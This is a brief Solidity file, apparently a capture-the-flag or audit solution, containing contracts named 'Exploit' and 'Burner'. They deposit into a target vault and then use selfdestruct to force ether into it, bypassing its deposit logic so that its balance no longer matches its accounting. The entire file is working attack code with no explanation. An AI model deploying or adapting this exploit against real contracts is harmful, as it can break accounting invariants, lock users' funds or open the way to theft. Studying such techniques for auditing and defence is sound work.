// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function deposit() external payable returns (uint256);
}

contract Burner {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

contract Exploit {
    address public vault;

    constructor(address target) payable {
        vault = target;
    }

    function run() external {
        IVault(vault).deposit{value: 1}();
        new Burner{value: address(this).balance}(vault);
    }

    receive() external payable {}
}
